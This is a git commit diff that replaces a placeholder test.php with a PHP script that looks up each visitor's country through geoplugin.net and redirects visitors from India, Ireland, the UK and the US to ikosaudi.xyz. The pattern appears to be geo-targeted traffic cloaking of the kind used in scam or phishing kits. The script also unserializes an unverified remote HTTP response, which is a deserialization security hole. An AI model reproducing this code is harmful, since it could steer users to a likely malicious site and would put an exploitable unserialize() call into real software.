6e2e133ebcd460e2eb1f44729e33ef968da9a385
ademoademo <84008690+ademoademo@users.noreply.github.com>
2021-05-11 08:16:56 +0000

    Update test.php

--- test.php
+++ test.php
@@ -1,1 +1,44 @@
-hhhhhhhhhhhhh
+<?php
+$zbii = $_SERVER['REMOTE_ADDR'];
+$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
+$addrDetailsArr = unserialize(file_get_contents($geoip)); 
+$country = $addrDetailsArr['geoplugin_countryName'];
+if (!$country)
+{
+    $country='Not found!';
+}
+if (strcmp($country, 'India')==0)
+{
+      header("location: http://ikosaudi.xyz ");
+     exit();
+} 
+//______________//
+
+
+else if (strcmp($country, 'Ireland')==0)
+{
+      header("location: http://ikosaudi.xyz ");
+     exit();
+} 
+//______________//
+
+else if (strcmp($country, 'United Kingdom')==0)
+{
+      header("location: http://ikosaudi.xyz ");
+     exit();
+} 
+//______________//
+else if (strcmp($country, 'United States')==0)
+{
+      header("location: http://ikosaudi.xyz ");
+     exit();
+}
+//______________//
+else if (strcmp($country, 'Iraq')==0)
+{
+      header("location: https://shahid.mbc.net/ar/ ");
+     exit();
+}
+
+?>
+fff
